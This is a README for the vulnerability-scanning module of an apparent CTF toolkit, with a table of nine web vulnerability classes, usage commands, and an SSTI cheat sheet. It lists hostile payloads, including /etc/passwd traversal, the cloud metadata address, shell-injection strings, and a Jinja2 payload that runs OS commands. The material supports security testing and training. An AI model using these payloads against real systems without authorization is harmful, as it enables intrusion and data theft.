# VulnScan Module

Tests endpoints for 9 vulnerability classes using targeted payloads.

## Supported Vulnerabilities

| Type | Payloads | Detection |
|------|---------|-----------|
| **SQLi** | Error-based, boolean, UNION, time-based | DB error strings, response diff |
| **XSS** | Reflected script/img/svg tags | Payload echoed in response |
| **SSTI** | Jinja2 `{{7*7}}`, ERB `<%= %>`, Twig | Math result `49` in response |
| **LFI** | `../etc/passwd`, `php://filter`, null byte | `root:` in response |
| **SSRF** | 127.0.0.1, 169.254.169.254, `file://` | Internal content returned |
| **IDOR** | Numeric ID 0/1/2/999/-1, `admin`, `root` | Unexpected 200 + secrets |
| **RCE** | `;id`, `$(id)`, backtick injection | `uid=` in response |
| **Open Redirect** | `//evil.com`, `https://evil.com` | Location header check |
| **CRLF** | `%0d%0a` injection | Injected header appears |

## Usage

```bash
# Test all vulnerabilities
python3 -m ctf_toolkit vuln -u http://target.com

# Test specific types
python3 -m ctf_toolkit vuln -u http://target.com --type sqli,ssti
python3 -m ctf_toolkit vuln -u http://target.com --type lfi,ssrf,rce

# Target a specific endpoint
python3 -m ctf_toolkit vuln -u http://target.com/api/search?q=test

# Save results
python3 -m ctf_toolkit vuln -u http://target.com -o vulns.json
```

## SSTI Cheat Sheet (built-in payloads)

```
{{7*7}}                                          → 49 (Jinja2/Twig)
{{config}}                                       → Config dump
{{lipsum.__globals__['os'].popen('id').read()}}  → RCE via Jinja2
${7*7}                                           → 49 (Freemarker/Thymeleaf)
<%= 7*7 %>                                       → 49 (ERB/Ruby)
```
